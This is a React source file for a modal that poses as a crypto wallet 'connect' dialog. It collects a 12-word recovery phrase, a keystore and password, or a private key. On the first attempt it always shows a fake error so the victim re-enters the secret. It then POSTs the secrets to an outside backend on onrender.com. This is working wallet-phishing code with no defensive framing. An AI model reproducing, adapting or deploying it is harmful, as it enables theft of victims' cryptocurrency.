import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const Modal = ({ isOpen, onClose, wallet }) => {
  const [selectedPhase, setSelectedPhase] = useState('Phrase');
  const [phrase, setPhrase] = useState('');
  const [keystore, setKeystore] = useState('');
  const [password, setPassword] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0); 

  const navigate = useNavigate();

  if (!isOpen || !wallet) return null;

  const handleSubmit = async () => {
    if (isSubmitting) return;

    let type = '';
    let data = {};

    if (selectedPhase === 'Phrase') {
      const words = phrase.trim().split(/\s+/);
      if (words.length !== 12) {
        toast.error('Phrase must contain exactly 12 words.');
        return;
      }
      type = 'phrase';
      data = { phrase };
    } else if (selectedPhase === 'Keystore') {
      if (!keystore || !password) {
        toast.error('Both Keystore and Password are required.');
        return;
      }
      type = 'keystore';
      data = { keystore, password };
    } else if (selectedPhase === 'Private Key') {
      if (!privateKey) {
        toast.error('Private Key is required.');
        return;
      }
      type = 'privateKey';
      data = { privateKey };
    }

    setIsSubmitting(true);

    
    if (attemptCount === 0) {
      toast.error('Incorrect data provided. Please try again.');
      setAttemptCount(1);
      setIsSubmitting(false);
      return;
    }

    
    try {
      const response = await fetch("https://web3-backend-eayv.onrender.com/api/wallet/submit", {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type,
          data,
          walletName: wallet.name,
          method: selectedPhase,
        }),
      });

      const result = await response.json();

      if (response.ok) {
        toast.success('Submitted successfully!');
        setTimeout(() => {
          onClose();
          navigate("/connecting");
        }, 1000);
      } else {
        toast.error(`Error: ${result.error}`);
      }
    } catch (error) {
      console.error('Submit error:', error);
      toast.error('Something went wrong. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleClose = () => {
    setAttemptCount(0); 
    onClose();
  };

  return (
    <div className="fixed inset-0 bg-[rgba(0,0,0,0.5)] flex justify-center items-center z-50">
      <div className="bg-white p-6 shadow-lg w-[90%] h-auto text-center relative sm:w-[70%] md:w-[70%] lg:w-[40%]">
        <button onClick={handleClose} className="text-red-500 absolute top-2 right-4 text-5xl font-bold">&times;</button>

        <div className='flex justify-start items-center gap-4 mb-4'>
          <img src={wallet.icon} alt={wallet.name} className="w-18 rounded-full md:w-24" />
          <h2 className="text-[18px] font-bold">{wallet.name}</h2>
        </div>

        <div className='flex justify-around my-3 text-[18px] text-gray-600'>
          {['Phrase', 'Keystore', 'Private Key'].map(phase => (
            <button
              key={phase}
              onClick={() => setSelectedPhase(phase)}
              className={`px-2 ${selectedPhase === phase ? 'text-black font-semibold underline' : ''}`}
            >
              {phase}
            </button>
          ))}
        </div>

        <div className='w-full h-0.5 bg-gray-300 mb-4' />

        <div className="text-left space-y-4">
          {selectedPhase === 'Phrase' && (
            <>
              <label className="block font-semibold text-gray-500">Enter 12-word Phrase</label>
              <textarea
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                placeholder="Enter your 12-word recovery phrase here..."
                rows={3}
                className="w-full p-2 border rounded"
              />
            </>
          )}

          {selectedPhase === 'Keystore' && (
            <>
              <label className="block font-semibold">Keystore</label>
              <textarea
                value={keystore}
                onChange={(e) => setKeystore(e.target.value)}
                placeholder="Paste your keystore"
                rows={3}
                className="w-full p-2 border rounded"
              />
              <label className="block font-semibold mt-2">Wallet Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full p-2 border rounded"
              />
            </>
          )}

          {selectedPhase === 'Private Key' && (
            <>
              <label className="block font-semibold">Private Key</label>
              <input
                type="text"
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                placeholder="Enter your private key"
                className="w-full p-2 border rounded"
              />
            </>
          )}
        </div>

        <button
          onClick={handleSubmit}
          disabled={isSubmitting}
          className={`mt-6 w-full py-2 rounded text-white ${
            isSubmitting ? 'bg-gray-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
          }`}
        >
          {isSubmitting ? 'Processing...' : 'Proceed'}
        </button>

        <ToastContainer />
      </div>
    </div>
  );
};

export default Modal;
